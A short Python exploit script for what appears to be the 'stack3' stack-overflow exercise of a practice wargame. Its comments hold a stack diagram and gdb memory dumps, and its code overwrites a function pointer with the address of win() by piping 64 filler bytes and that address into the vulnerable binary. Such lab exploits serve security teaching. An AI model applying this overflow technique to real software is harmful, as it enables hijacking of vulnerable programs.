#!/usr/bin/python3
from subprocess import Popen, PIPE
import shlex
import struct

'''
	+----------+
	| A A A A  |  <=== FP-72 [ACID] : gets(FP-72) 
	+----------+-\
	   ...       |
	    ...      | 64 bytes in between
	     ...     |
	+----------+-/
	| func ptr |  <=== FP-8 : 0x0001047c @ win()
	+----------+
	| saved FP |
	+----------+
	| saved LR |  <--- FP 
	+----------+

(gdb) r <<< $(python3 -c "import struct; print( 'A' * 64 + struct.pack('<i', 0x0001047c).decode('utf-8') )")
(gdb) print win
$2 = {<text variable, no debug info>} 0x1047c <win>

STACK state before ACID rain
(gdb) x/20xw $fp-72
0xbefff1e4:     0xb6ffbfc4      0x00000003      0xb6e77be8      0x00000000
0xbefff1f4:     0xb6e779f8      0xbefff230      0xb6fd618c      0x00000000
0xbefff204:     0x00000000      0x00010444      0x0001053c      0xb6fb2ba0
0xbefff214:     0x000104ec      0x00000000      0x00010354      0x00000000
0xbefff224:     0x00000000      0x00000000      0xb6e8c294      0xb6fb1000

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE

STACK state after ACID rain
(gdb) x/20xw $fp-72
0xbefff1e4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1f4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff204:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff214:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff224:     0x0001047c      0x00000000      0xb6e8c294      0xb6fb1000
'''

target = "./stack3"
payload = "A"*64
payload += struct.pack('<I', 0x0001047c).decode('utf-8') 

# write payload to disk (for manual exploitation)
fo = open(target + '.input', 'wb')
fo.write(payload.encode('utf-8'))
fo.close()

p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload.encode('utf-8'))
p.stdin.flush()				# send payload to target process
